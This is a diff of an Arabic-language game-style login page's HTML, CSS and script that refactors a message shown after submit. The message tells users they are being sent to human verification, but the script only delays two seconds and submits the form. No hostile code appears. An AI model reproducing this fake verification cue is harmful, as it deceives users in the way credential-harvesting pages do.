@@ -73,15 +73,6 @@ body{
 }
 .small{text-align:center;font-size:13px;color:#ccc;margin:12px 0;}
 .line{height:1px;background:#444;margin:15px 0;}
-
-/* رسالة التحقق */
-#verifyBox{
-  display:none;
-  text-align:center;
-  font-size:16px;
-  margin-top:15px;
-  color:#ffd86b;
-}
 </style>
 </head>
 
@@ -117,9 +108,12 @@ body{
       <input type="text" name="Player_Experience" placeholder="خبراتك" required>
 
       <button type="submit" class="mainbtn">تسجيل الدخول</button>
+
     </form>
 
-    <div id="verifyBox">سيتم نقلك إلى التحقق من أنك إنسان...</div>
+    <div id="verifyMsg" style="display:none;text-align:center;color:#ffd86b;margin-top:10px;">
+      سيتم نقلك إلى التحقق من أنك إنسان...
+    </div>
 
     <div class="small">ليس لديك حساب؟ اشترك</div>
   </div>
@@ -127,13 +121,12 @@ body{
 
 <script>
 const form = document.getElementById("loginForm");
-const verifyBox = document.getElementById("verifyBox");
 
 form.addEventListener("submit", function(e){
   e.preventDefault();
-  verifyBox.style.display = "block";
+  document.getElementById("verifyMsg").style.display = "block";
 
-  setTimeout(() => {
+  setTimeout(function(){
     form.submit();
   }, 2000);
 });
